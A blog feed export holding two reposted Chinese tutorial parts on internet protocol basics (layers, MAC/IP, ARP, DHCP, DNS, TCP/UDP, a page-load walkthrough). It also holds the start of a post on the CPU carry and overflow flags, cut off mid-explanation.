<p>我们已经知道，网络通信就是交换数据包。电脑A向电脑B发送一个数据包，后者收到了，回复一个数据包，从而实现两台电脑之间的通信。数据包的结构，基本上是下面这样：</p>
<figure data-type="image" tabindex="1"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052913.png" alt="img" loading="lazy"></figure>
<p>发送这个包，需要知道两个地址：</p>
<blockquote>
<ul>
<li>
<p>对方的MAC地址</p>
</li>
<li>
<p>对方的IP地址</p>
</li>
</ul>
</blockquote>
<p>有了这两个地址，数据包才能准确送到接收者手中。但是，前面说过，MAC地址有局限性，如果两台电脑不在同一个子网络，就无法知道对方的MAC地址，必须通过网关（gateway）转发。</p>
<figure data-type="image" tabindex="2"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061101.jpg" alt="img" loading="lazy"></figure>
<p>上图中，1号电脑要向4号电脑发送一个数据包。它先判断4号电脑是否在同一个子网络，结果发现不是（后文介绍判断方法），于是就把这个数据包发到网关A。网关A通过路由协议，发现4号电脑位于子网络B，又把数据包发给网关B，网关B再转发到4号电脑。</p>
<p>1号电脑把数据包发到网关A，必须知道网关A的MAC地址。所以，数据包的目标地址，实际上分成两种情况：</p>
<table>
<thead>
<tr>
<th>场景</th>
<th>数据包地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>同一个子网络</td>
<td>对方的MAC地址，对方的IP地址</td>
</tr>
<tr>
<td>非同一个子网络</td>
<td>网关的MAC地址，对方的IP地址</td>
</tr>
</tbody>
</table>
<p>发送数据包之前，电脑必须判断对方是否在同一个子网络，然后选择相应的MAC地址。接下来，我们就来看，实际使用中，这个过程是怎么完成的。</p>
<p><strong>八、用户的上网设置</strong></p>
<p><strong>8.1 静态IP地址</strong></p>
<p>你买了一台新电脑，插上网线，开机，这时电脑能够上网吗？</p>
<figure data-type="image" tabindex="3"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061110.jpg" alt="img" loading="lazy"></figure>
<p>通常你必须做一些设置。有时，管理员（或者ISP）会告诉你下面四个参数，你把它们填入操作系统，计算机就能连上网了：</p>
<blockquote>
<ul>
<li>本机的IP地址</li>
<li>子网掩码</li>
<li>网关的IP地址</li>
<li>DNS的IP地址</li>
</ul>
</blockquote>
<p>下图是Windows系统的设置窗口。</p>
<figure data-type="image" tabindex="4"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061111.png" alt="img" loading="lazy"></figure>
<p>这四个参数缺一不可，后文会解释为什么需要知道它们才能上网。由于它们是给定的，计算机每次开机，都会分到同样的IP地址，所以这种情况被称作&quot;静态IP地址上网&quot;。</p>
<p>但是，这样的设置很专业，普通用户望而生畏，而且如果一台电脑的IP地址保持不变，其他电脑就不能使用这个地址，不够灵活。出于这两个原因，大多数用户使用&quot;动态IP地址上网&quot;。</p>
<p><strong>8.2 动态IP地址</strong></p>
<p>所谓&quot;动态IP地址&quot;，指计算机开机后，会自动分配到一个IP地址，不用人为设定。它使用的协议叫做<a href="http://zh.wikipedia.org/zh/DHCP">DHCP协议</a>。</p>
<p>这个协议规定，每一个子网络中，有一台计算机负责管理本网络的所有IP地址，它叫做&quot;DHCP服务器&quot;。新的计算机加入网络，必须向&quot;DHCP服务器&quot;发送一个&quot;DHCP请求&quot;数据包，申请IP地址和相关的网络参数。</p>
<p>前面说过，如果两台计算机在同一个子网络，必须知道对方的MAC地址和IP地址，才能发送数据包。但是，新加入的计算机不知道这两个地址，怎么发送数据包呢？</p>
<p>DHCP协议做了一些巧妙的规定。</p>
<p><strong>8.3 DHCP协议</strong></p>
<p>首先，它是一种应用层协议，建立在UDP协议之上，所以整个数据包是这样的：</p>
<figure data-type="image" tabindex="5"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061102.png" alt="img" loading="lazy"></figure>
<p>（1）最前面的&quot;以太网标头&quot;，设置发出方（本机）的MAC地址和接收方（DHCP服务器）的MAC地址。前者就是本机网卡的MAC地址，后者这时不知道，就填入一个广播地址：FF-FF-FF-FF-FF-FF。</p>
<p>（2）后面的&quot;IP标头&quot;，设置发出方的IP地址和接收方的IP地址。这时，对于这两者，本机都不知道。于是，发出方的IP地址就设为0.0.0.0，接收方的IP地址设为255.255.255.255。</p>
<p>（3）最后的&quot;UDP标头&quot;，设置发出方的端口和接收方的端口。这一部分是DHCP协议规定好的，发出方是68端口，接收方是67端口。</p>
<p>这个数据包构造完成后，就可以发出了。以太网是广播发送，同一个子网络的每台计算机都收到了这个包。因为接收方的MAC地址是FF-FF-FF-FF-FF-FF，看不出是发给谁的，所以每台收到这个包的计算机，还必须分析这个包的IP地址，才能确定是不是发给自己的。当看到发出方IP地址是0.0.0.0，接收方是255.255.255.255，于是DHCP服务器知道&quot;这个包是发给我的&quot;，而其他计算机就可以丢弃这个包。</p>
<p>接下来，DHCP服务器读出这个包的数据内容，分配好IP地址，发送回去一个&quot;DHCP响应&quot;数据包。这个响应包的结构也是类似的，以太网标头的MAC地址是双方的网卡地址，IP标头的IP地址是DHCP服务器的IP地址（发出方）和255.255.255.255（接收方），UDP标头的端口是67（发出方）和68（接收方），分配给请求端的IP地址和本网络的具体参数则包含在Data部分。</p>
<p>新加入的计算机收到这个响应包，于是就知道了自己的IP地址、子网掩码、网关地址、DNS服务器等等参数。</p>
<p><strong>8.4 上网设置：小结</strong></p>
<p>这个部分，需要记住的就是一点：不管是&quot;静态IP地址&quot;还是&quot;动态IP地址&quot;，电脑上网的首要步骤，是确定四个参数。这四个值很重要，值得重复一遍：</p>
<blockquote>
<ul>
<li>本机的IP地址</li>
<li>子网掩码</li>
<li>网关的IP地址</li>
<li>DNS的IP地址</li>
</ul>
</blockquote>
<p>有了这几个数值，电脑就可以上网&quot;冲浪&quot;了。接下来，我们来看一个实例，当用户访问网页的时候，互联网协议是怎么运作的。</p>
<p><strong>九、一个实例：访问网页</strong></p>
<p><strong>9.1 本机参数</strong></p>
<p>我们假定，经过上一节的步骤，用户设置好了自己的网络参数：</p>
<blockquote>
<ul>
<li>本机的IP地址：192.168.1.100</li>
<li>子网掩码：255.255.255.0</li>
<li>网关的IP地址：192.168.1.1</li>
<li>DNS的IP地址：8.8.8.8</li>
</ul>
</blockquote>
<p>然后他打开浏览器，想要访问Google，在地址栏输入了网址：www.google.com。</p>
<figure data-type="image" tabindex="6"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061103.png" alt="img" loading="lazy"></figure>
<p>这意味着，浏览器要向Google发送一个网页请求的数据包。</p>
<p><strong>9.2 DNS协议</strong></p>
<p>我们知道，发送数据包，必须要知道对方的IP地址。但是，现在，我们只知道网址www.google.com，不知道它的IP地址。</p>
<p><a href="http://en.wikipedia.org/wiki/Domain_Name_System">DNS协议</a>可以帮助我们，将这个网址转换成IP地址。已知DNS服务器为8.8.8.8，于是我们向这个地址发送一个DNS数据包（53端口）。</p>
<figure data-type="image" tabindex="7"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061105.png" alt="img" loading="lazy"></figure>
<p>然后，DNS服务器做出响应，告诉我们Google的IP地址是172.194.72.105。于是，我们知道了对方的IP地址。</p>
<p><strong>9.3 子网掩码</strong></p>
<p>接下来，我们要判断，这个IP地址是不是在同一个子网络，这就要用到子网掩码。</p>
<p>已知子网掩码是255.255.255.0，本机用它对自己的IP地址192.168.1.100，做一个二进制的AND运算（两个数位都为1，结果为1，否则为0），计算结果为192.168.1.0；然后对Google的IP地址172.194.72.105也做一个AND运算，计算结果为172.194.72.0。这两个结果不相等，所以结论是，Google与本机不在同一个子网络。</p>
<p>因此，我们要向Google发送数据包，必须通过网关192.168.1.1转发，也就是说，接收方的MAC地址将是网关的MAC地址。</p>
<p><strong>9.4 应用层协议</strong></p>
<p>浏览网页用的是HTTP协议，它的整个数据包构造是这样的：</p>
<figure data-type="image" tabindex="8"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061106.png" alt="img" loading="lazy"></figure>
<p>HTTP部分的内容，类似于下面这样：</p>
<blockquote>
<p>GET / HTTP/1.1<br>
　　Host: www.google.com<br>
　　Connection: keep-alive<br>
　　User-Agent: Mozilla/5.0 (Windows NT 6.1) ......<br>
　　Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>
　　Accept-Encoding: gzip,deflate,sdch<br>
　　Accept-Language: zh-CN,zh;q=0.8<br>
　　Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br>
　　Cookie: ... ...</p>
</blockquote>
<p>我们假定这个部分的长度为4960字节，它会被嵌在TCP数据包之中。</p>
<p><strong>9.5 TCP协议</strong></p>
<p>TCP数据包需要设置端口，接收方（Google）的HTTP端口默认是80，发送方（本机）的端口是一个随机生成的1024-65535之间的整数，假定为51775。</p>
<p>TCP数据包的标头长度为20字节，加上嵌入HTTP的数据包，总长度变为4980字节。</p>
<p><strong>9.6 IP协议</strong></p>
<p>然后，TCP数据包再嵌入IP数据包。IP数据包需要设置双方的IP地址，这是已知的，发送方是192.168.1.100（本机），接收方是172.194.72.105（Google）。</p>
<p>IP数据包的标头长度为20字节，加上嵌入的TCP数据包，总长度变为5000字节。</p>
<p><strong>9.7 以太网协议</strong></p>
<p>最后，IP数据包嵌入以太网数据包。以太网数据包需要设置双方的MAC地址，发送方为本机的网卡MAC地址，接收方为网关192.168.1.1的MAC地址（通过ARP协议得到）。</p>
<p>以太网数据包的数据部分，最大长度为1500字节，而现在的IP数据包长度为5000字节。因此，IP数据包必须分割成四个包。因为每个包都有自己的IP标头（20字节），所以四个包的IP数据包的长度分别为1500、1500、1500、560。</p>
<figure data-type="image" tabindex="9"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061107.png" alt="img" loading="lazy"></figure>
<p><strong>9.8 服务器端响应</strong></p>
<p>经过多个网关的转发，Google的服务器172.194.72.105，收到了这四个以太网数据包。</p>
<p>根据IP标头的序号，Google将四个包拼起来，取出完整的TCP数据包，然后读出里面的&quot;HTTP请求&quot;，接着做出&quot;HTTP响应&quot;，再用TCP协议发回来。</p>
<p>本机收到HTTP响应以后，就可以将网页显示出来，完成一次网络通信。</p>
<figure data-type="image" tabindex="10"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061104.jpg" alt="img" loading="lazy"></figure>
<p>这个例子就到此为止，虽然经过了简化，但它大致上反映了互联网协议的整个通信过程。</p>
<p>（完）</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[（转载）互联网协议入门（一）]]></title>
        <id>https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-yi/</id>
        <link href="https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-yi/">
        </link>
        <updated>2020-11-24T11:32:10.000Z</updated>
        <content type="html"><![CDATA[<h1 id="转载互联网协议入门一">（转载）互联网协议入门（一）</h1>
<p>作者： <a href="http://www.ruanyifeng.com/">阮一峰</a></p>
<p>日期： <a href="http://www.ruanyifeng.com/blog/2012/05/">2012年5月31日</a></p>
<p>我们每天使用互联网，你是否想过，它是如何实现的？</p>
<p>全世界几十亿台电脑，连接在一起，两两通信。上海的某一块网卡送出信号，洛杉矶的另一块网卡居然就收到了，两者实际上根本不知道对方的物理位置，你不觉得这是很神奇的事情吗？</p>
<p>互联网的核心是一系列协议，总称为&quot;互联网协议&quot;（Internet Protocol Suite）。它们对电脑如何连接和组网，做出了详尽的规定。理解了这些协议，就理解了互联网的原理。</p>
<p>下面就是我的学习笔记。因为这些协议实在太复杂、太庞大，我想整理一个简洁的框架，帮助自己从总体上把握它们。为了保证简单易懂，我做了大量的简化，有些地方并不全面和精确，但是应该能够说清楚互联网的原理。</p>
<p>=================================================</p>
<p><strong>互联网协议入门</strong></p>
<p>作者：阮一峰</p>
<figure data-type="image" tabindex="1"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052901.jpg" alt="img" loading="lazy"></figure>
<p><strong>一、概述</strong></p>
<p><strong>1.1 五层模型</strong></p>
<p>互联网的实现，分成好几层。每一层都有自己的功能，就像建筑物一样，每一层都靠下一层支持。</p>
<p>用户接触到的，只是最上面的一层，根本没有感觉到下面的层。要理解互联网，必须从最下层开始，自下而上理解每一层的功能。</p>
<p>如何分层有不同的模型，有的模型分七层，有的分四层。我觉得，把互联网分成五层，比较容易解释。</p>
<figure data-type="image" tabindex="2"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052902.png" alt="img" loading="lazy"></figure>
<p>如上图所示，最底下的一层叫做&quot;实体层&quot;（Physical Layer），最上面的一层叫做&quot;应用层&quot;（Application Layer），中间的三层（自下而上）分别是&quot;链接层&quot;（Link Layer）、&quot;网络层&quot;（Network Layer）和&quot;传输层&quot;（Transport Layer）。越下面的层，越靠近硬件；越上面的层，越靠近用户。</p>
<p>它们叫什么名字，其实并不重要。只需要知道，互联网分成若干层就可以了。</p>
<p><strong>1.2 层与协议</strong></p>
<p>每一层都是为了完成一种功能。为了实现这些功能，就需要大家都遵守共同的规则。</p>
<p>大家都遵守的规则，就叫做&quot;协议&quot;（protocol）。</p>
<p>互联网的每一层，都定义了很多协议。这些协议的总称，就叫做&quot;互联网协议&quot;（Internet Protocol Suite）。它们是互联网的核心，下面介绍每一层的功能，主要就是介绍每一层的主要协议。</p>
<p><strong>二、实体层</strong></p>
<p>我们从最底下的一层开始。</p>
<p>电脑要组网，第一件事要干什么？当然是先把电脑连起来，可以用光缆、电缆、双绞线、无线电波等方式。</p>
<figure data-type="image" tabindex="3"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052903.png" alt="img" loading="lazy"></figure>
<p><strong>这就叫做&quot;实体层&quot;，它就是把电脑连接起来的物理手段。它主要规定了网络的一些电气特性，作用是负责传送0和1的电信号。</strong></p>
<p><strong>三、链接层</strong></p>
<p><strong>3.1 定义</strong></p>
<p>单纯的0和1没有任何意义，必须规定解读方式：多少个电信号算一组？每个信号位有何意义？</p>
<p><strong>这就是&quot;链接层&quot;的功能，它在&quot;实体层&quot;的上方，确定了0和1的分组方式。</strong></p>
<p><strong>3.2 以太网协议</strong></p>
<p>早期的时候，每家公司都有自己的电信号分组方式。逐渐地，一种叫做<a href="http://zh.wikipedia.org/wiki/%E4%BB%A5%E5%A4%AA%E7%BD%91">&quot;以太网&quot;</a>（Ethernet）的协议，占据了主导地位。</p>
<p>以太网规定，一组电信号构成一个数据包，叫做&quot;帧&quot;（Frame）。每一帧分成两个部分：标头（Head）和数据（Data）。</p>
<figure data-type="image" tabindex="4"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052904.png" alt="img" loading="lazy"></figure>
<p>&quot;标头&quot;包含数据包的一些说明项，比如发送者、接受者、数据类型等等；&quot;数据&quot;则是数据包的具体内容。</p>
<p>&quot;标头&quot;的长度，固定为18字节。&quot;数据&quot;的长度，最短为46字节，最长为1500字节。因此，整个&quot;帧&quot;最短为64字节，最长为1518字节。如果数据很长，就必须分割成多个帧进行发送。</p>
<p><strong>3.3 MAC地址</strong></p>
<p>上面提到，以太网数据包的&quot;标头&quot;，包含了发送者和接受者的信息。那么，发送者和接受者是如何标识呢？</p>
<p>以太网规定，连入网络的所有设备，都必须具有&quot;网卡&quot;接口。数据包必须是从一块网卡，传送到另一块网卡。网卡的地址，就是数据包的发送地址和接收地址，这叫做MAC地址。</p>
<figure data-type="image" tabindex="5"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052905.jpg" alt="img" loading="lazy"></figure>
<p>每块网卡出厂的时候，都有一个全世界独一无二的MAC地址，长度是48个二进制位，通常用12个十六进制数表示。</p>
<figure data-type="image" tabindex="6"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052906.png" alt="img" loading="lazy"></figure>
<p>前6个十六进制数是厂商编号，后6个是该厂商的网卡流水号。有了MAC地址，就可以定位网卡和数据包的路径了。</p>
<p><strong>3.4 广播</strong></p>
<p>定义地址只是第一步，后面还有更多的步骤。</p>
<p>首先，一块网卡怎么会知道另一块网卡的MAC地址？</p>
<p>回答是有一种ARP协议，可以解决这个问题。这个留到后面介绍，这里只需要知道，以太网数据包必须知道接收方的MAC地址，然后才能发送。</p>
<p>其次，就算有了MAC地址，系统怎样才能把数据包准确送到接收方？</p>
<p>回答是以太网采用了一种很&quot;原始&quot;的方式，它不是把数据包准确送到接收方，而是向本网络内所有计算机发送，让每台计算机自己判断，是否为接收方。</p>
<figure data-type="image" tabindex="7"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052907.png" alt="img" loading="lazy"></figure>
<p>上图中，1号计算机向2号计算机发送一个数据包，同一个子网络的3号、4号、5号计算机都会收到这个包。它们读取这个包的&quot;标头&quot;，找到接收方的MAC地址，然后与自身的MAC地址相比较，如果两者相同，就接受这个包，做进一步处理，否则就丢弃这个包。这种发送方式就叫做&quot;广播&quot;（broadcasting）。</p>
<p>有了数据包的定义、网卡的MAC地址、广播的发送方式，&quot;链接层&quot;就可以在多台计算机之间传送数据了。</p>
<p><strong>四、网络层</strong></p>
<p><strong>4.1 网络层的由来</strong></p>
<p>以太网协议，依靠MAC地址发送数据。理论上，单单依靠MAC地址，上海的网卡就可以找到洛杉矶的网卡了，技术上是可以实现的。</p>
<p>但是，这样做有一个重大的缺点。以太网采用广播方式发送数据包，所有成员人手一&quot;包&quot;，不仅效率低，而且局限在发送者所在的子网络。也就是说，如果两台计算机不在同一个子网络，广播是传不过去的。这种设计是合理的，否则互联网上每一台计算机都会收到所有包，那会引起灾难。</p>
<p>互联网是无数子网络共同组成的一个巨型网络，很像想象上海和洛杉矶的电脑会在同一个子网络，这几乎是不可能的。</p>
<figure data-type="image" tabindex="8"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052914.png" alt="img" loading="lazy"></figure>
<p>因此，必须找到一种方法，能够区分哪些MAC地址属于同一个子网络，哪些不是。如果是同一个子网络，就采用广播方式发送，否则就采用&quot;路由&quot;方式发送。（&quot;路由&quot;的意思，就是指如何向不同的子网络分发数据包，这是一个很大的主题，本文不涉及。）遗憾的是，MAC地址本身无法做到这一点。它只与厂商有关，与所处网络无关。</p>
<p><strong>这就导致了&quot;网络层&quot;的诞生。它的作用是引进一套新的地址，使得我们能够区分不同的计算机是否属于同一个子网络。这套地址就叫做&quot;网络地址&quot;，简称&quot;网址&quot;。</strong></p>
<p>于是，&quot;网络层&quot;出现以后，每台计算机有了两种地址，一种是MAC地址，另一种是网络地址。两种地址之间没有任何联系，MAC地址是绑定在网卡上的，网络地址则是管理员分配的，它们只是随机组合在一起。</p>
<p>网络地址帮助我们确定计算机所在的子网络，MAC地址则将数据包送到该子网络中的目标网卡。因此，从逻辑上可以推断，必定是先处理网络地址，然后再处理MAC地址。</p>
<p><strong>4.2 IP协议</strong></p>
<p>规定网络地址的协议，叫做IP协议。它所定义的地址，就被称为IP地址。</p>
<p>目前，广泛采用的是IP协议第四版，简称IPv4。这个版本规定，网络地址由32个二进制位组成。</p>
<figure data-type="image" tabindex="9"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052908.png" alt="img" loading="lazy"></figure>
<p>习惯上，我们用分成四段的十进制数表示IP地址，从0.0.0.0一直到255.255.255.255。</p>
<p>互联网上的每一台计算机，都会分配到一个IP地址。这个地址分成两个部分，前一部分代表网络，后一部分代表主机。比如，IP地址172.16.254.1，这是一个32位的地址，假定它的网络部分是前24位（172.16.254），那么主机部分就是后8位（最后的那个1）。处于同一个子网络的电脑，它们IP地址的网络部分必定是相同的，也就是说172.16.254.2应该与172.16.254.1处在同一个子网络。</p>
<p>但是，问题在于单单从IP地址，我们无法判断网络部分。还是以172.16.254.1为例，它的网络部分，到底是前24位，还是前16位，甚至前28位，从IP地址上是看不出来的。</p>
<p>那么，怎样才能从IP地址，判断两台计算机是否属于同一个子网络呢？这就要用到另一个参数&quot;子网掩码&quot;（subnet mask）。</p>
<p>所谓&quot;子网掩码&quot;，就是表示子网络特征的一个参数。它在形式上等同于IP地址，也是一个32位二进制数字，它的网络部分全部为1，主机部分全部为0。比如，IP地址172.16.254.1，如果已知网络部分是前24位，主机部分是后8位，那么子网络掩码就是11111111.11111111.11111111.00000000，写成十进制就是255.255.255.0。</p>
<p>知道&quot;子网掩码&quot;，我们就能判断，任意两个IP地址是否处在同一个子网络。方法是将两个IP地址与子网掩码分别进行AND运算（两个数位都为1，运算结果为1，否则为0），然后比较结果是否相同，如果是的话，就表明它们在同一个子网络中，否则就不是。</p>
<p>比如，已知IP地址172.16.254.1和172.16.254.233的子网掩码都是255.255.255.0，请问它们是否在同一个子网络？两者与子网掩码分别进行AND运算，结果都是172.16.254.0，因此它们在同一个子网络。</p>
<p>总结一下，IP协议的作用主要有两个，一个是为每一台计算机分配IP地址，另一个是确定哪些地址在同一个子网络。</p>
<p><strong>4.3 IP数据包</strong></p>
<p>根据IP协议发送的数据，就叫做IP数据包。不难想象，其中必定包括IP地址信息。</p>
<p>但是前面说过，以太网数据包只包含MAC地址，并没有IP地址的栏位。那么是否需要修改数据定义，再添加一个栏位呢？</p>
<p>回答是不需要，我们可以把IP数据包直接放进以太网数据包的&quot;数据&quot;部分，因此完全不用修改以太网的规格。这就是互联网分层结构的好处：上层的变动完全不涉及下层的结构。</p>
<p>具体来说，IP数据包也分为&quot;标头&quot;和&quot;数据&quot;两个部分。</p>
<figure data-type="image" tabindex="10"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052909.png" alt="img" loading="lazy"></figure>
<p>&quot;标头&quot;部分主要包括版本、长度、IP地址等信息，&quot;数据&quot;部分则是IP数据包的具体内容。它放进以太网数据包后，以太网数据包就变成了下面这样。</p>
<figure data-type="image" tabindex="11"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052910.png" alt="img" loading="lazy"></figure>
<p>IP数据包的&quot;标头&quot;部分的长度为20到60字节，整个数据包的总长度最大为65,535字节。因此，理论上，一个IP数据包的&quot;数据&quot;部分，最长为65,515字节。前面说过，以太网数据包的&quot;数据&quot;部分，最长只有1500字节。因此，如果IP数据包超过了1500字节，它就需要分割成几个以太网数据包，分开发送了。</p>
<p><strong>4.4 ARP协议</strong></p>
<p>关于&quot;网络层&quot;，还有最后一点需要说明。</p>
<p>因为IP数据包是放在以太网数据包里发送的，所以我们必须同时知道两个地址，一个是对方的MAC地址，另一个是对方的IP地址。通常情况下，对方的IP地址是已知的（后文会解释），但是我们不知道它的MAC地址。</p>
<p>所以，我们需要一种机制，能够从IP地址得到MAC地址。</p>
<p>这里又可以分成两种情况。第一种情况，如果两台主机不在同一个子网络，那么事实上没有办法得到对方的MAC地址，只能把数据包传送到两个子网络连接处的&quot;网关&quot;（gateway），让网关去处理。</p>
<p>第二种情况，如果两台主机在同一个子网络，那么我们可以用ARP协议，得到对方的MAC地址。ARP协议也是发出一个数据包（包含在以太网数据包中），其中包含它所要查询主机的IP地址，在对方的MAC地址这一栏，填的是FF:FF:FF:FF:FF:FF，表示这是一个&quot;广播&quot;地址。它所在子网络的每一台主机，都会收到这个数据包，从中取出IP地址，与自身的IP地址进行比较。如果两者相同，都做出回复，向对方报告自己的MAC地址，否则就丢弃这个包。</p>
<p>总之，有了ARP协议之后，我们就可以得到同一个子网络内的主机MAC地址，可以把数据包发送到任意一台主机之上了。</p>
<p><strong>五、传输层</strong></p>
<p><strong>5.1 传输层的由来</strong></p>
<p>有了MAC地址和IP地址，我们已经可以在互联网上任意两台主机上建立通信。</p>
<p>接下来的问题是，同一台主机上有许多程序都需要用到网络，比如，你一边浏览网页，一边与朋友在线聊天。当一个数据包从互联网上发来的时候，你怎么知道，它是表示网页的内容，还是表示在线聊天的内容？</p>
<p>也就是说，我们还需要一个参数，表示这个数据包到底供哪个程序（进程）使用。这个参数就叫做&quot;端口&quot;（port），它其实是每一个使用网卡的程序的编号。每个数据包都发到主机的特定端口，所以不同的程序就能取到自己所需要的数据。</p>
<p>&quot;端口&quot;是0到65535之间的一个整数，正好16个二进制位。0到1023的端口被系统占用，用户只能选用大于1023的端口。不管是浏览网页还是在线聊天，应用程序会随机选用一个端口，然后与服务器的相应端口联系。</p>
<p>**&quot;传输层&quot;的功能，就是建立&quot;端口到端口&quot;的通信。相比之下，&quot;网络层&quot;的功能是建立&quot;主机到主机&quot;的通信。只要确定主机和端口，我们就能实现程序之间的交流。**因此，Unix系统就把主机+端口，叫做&quot;套接字&quot;（socket）。有了它，就可以进行网络应用程序开发了。</p>
<p><strong>5.2 UDP协议</strong></p>
<p>现在，我们必须在数据包中加入端口信息，这就需要新的协议。最简单的实现叫做UDP协议，它的格式几乎就是在数据前面，加上端口号。</p>
<p>UDP数据包，也是由&quot;标头&quot;和&quot;数据&quot;两部分组成。</p>
<figure data-type="image" tabindex="12"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052911.png" alt="img" loading="lazy"></figure>
<p>&quot;标头&quot;部分主要定义了发出端口和接收端口，&quot;数据&quot;部分就是具体的内容。然后，把整个UDP数据包放入IP数据包的&quot;数据&quot;部分，而前面说过，IP数据包又是放在以太网数据包之中的，所以整个以太网数据包现在变成了下面这样：</p>
<figure data-type="image" tabindex="13"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052912.png" alt="img" loading="lazy"></figure>
<p>UDP数据包非常简单，&quot;标头&quot;部分一共只有8个字节，总长度不超过65,535字节，正好放进一个IP数据包。</p>
<p><strong>5.3 TCP协议</strong></p>
<p>UDP协议的优点是比较简单，容易实现，但是缺点是可靠性较差，一旦数据包发出，无法知道对方是否收到。</p>
<p>为了解决这个问题，提高网络可靠性，TCP协议就诞生了。这个协议非常复杂，但可以近似认为，它就是有确认机制的UDP协议，每发出一个数据包都要求确认。如果有一个数据包遗失，就收不到确认，发出方就知道有必要重发这个数据包了。</p>
<p>因此，TCP协议能够确保数据不会遗失。它的缺点是过程复杂、实现困难、消耗较多的资源。</p>
<p>TCP数据包和UDP数据包一样，都是内嵌在IP数据包的&quot;数据&quot;部分。TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。</p>
<p><strong>六、应用层</strong></p>
<p>应用程序收到&quot;传输层&quot;的数据，接下来就要进行解读。由于互联网是开放架构，数据来源五花八门，必须事先规定好格式，否则根本无法解读。</p>
<p><strong>&quot;应用层&quot;的作用，就是规定应用程序的数据格式。</strong></p>
<p>举例来说，TCP协议可以为各种各样的程序传递数据，比如Email、WWW、FTP等等。那么，必须有不同协议规定电子邮件、网页、FTP数据的格式，这些应用程序协议就构成了&quot;应用层&quot;。</p>
<p>这是最高的一层，直接面对用户。它的数据就放在TCP数据包的&quot;数据&quot;部分。因此，现在的以太网的数据包就变成下面这样。</p>
<figure data-type="image" tabindex="14"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052913.png" alt="img" loading="lazy"></figure>
<p>至此，整个互联网的五层结构，自下而上全部讲完了。这是从系统的角度，解释互联网是如何构成的。下一篇，我反过来，从用户的角度，自上而下看看这个结构是如何发挥作用，完成一次网络数据交换的。</p>
<p>（完）</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CF OF 进位 溢出]]></title>
        <id>https://Morn-zh.github.io/post/cf-of-jin-wei-yi-chu/</id>
        <link href="https://Morn-zh.github.io/post/cf-of-jin-wei-yi-chu/">
        </link>
        <updated>2020-10-30T11:12:32.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-我的问题">0x01 我的问题</h1>
<ul>
<li>Q：CF表示进位，OF表示溢出，那么进位是否表示溢出，又或者溢出是否就一定会有进位？</li>
</ul>
<p>想要直接看答案，直接跳转<strong>0x04 回到问题</strong>，想要理解过程可以接着往下看</p>
<h1 id="0x02-相关的知识">0x02 相关的知识</h1>
<p>解答疑问之前，先明确下，溢出是<strong>所要表示的数值</strong>超出了<strong>本身能够表示的范围</strong></p>
<p>以8位寄存器为例，来看看在将<strong>操作数</strong>视为<strong>无符号数</strong>和<strong>有符号数</strong>时能够表示的范围</p>
<p>操作数 xxxx xxxx</p>
<p>无符号数 xxxx xxxx</p>
<p>有符号数 符号位+xxx xxxx</p>
<table>
<thead>
<tr>
<th></th>
<th>范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>无符号数</td>
<td>0~2<sup>8</sup>-1</td>
</tr>
<tr>
<td>有符号数</td>
<td>-2<sup>7</sup>~2<sup>7</sup>-1</td>
</tr>
</tbody>
</table>
<p><strong>标志位CF/OF为1时，表示的含义</strong></p>
<table>
<thead>
<tr>
<th>标志位</th>
<th>含义</th>
<th>表示结果是否正确（将进位值作为权值考虑在内）</th>
</tr>
</thead>
<tbody>
<tr>
<td>CF=1</td>
<td><strong>无符号数</strong>运算超出范围</td>
<td><strong>依旧正确</strong></td>
</tr>
<tr>
<td>OF=1</td>
<td><strong>有符号数</strong>运算超出范围</td>
<td>错误</td>
</tr>
</tbody>
</table>
<p>例1：操作数看做无符号数，关注CF<br>
<img src="https://Morn-zh.github.io/post-images/1604056428774.png" alt="" loading="lazy"></p>
<p>例2：操作数看做无符号数，关注CF</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/1604056465337.png" alt="" loading="lazy"></figure>
<p>将例1看做有符号数，关注OF</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/1604056485295.png" alt="" loading="lazy"></figure>
<p>将例2看做有符号数，关注OF</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/1604056493045.png" alt="" loading="lazy"></figure>
<h1 id="0x03-怎么理解呢">0x03 怎么理解呢？</h1>
<p>处理器会<strong>同时</strong>按照<strong>无符号</strong>和<strong>有符号</strong>运算法则进行运算，并且设置CF和OF两个标志位</p>
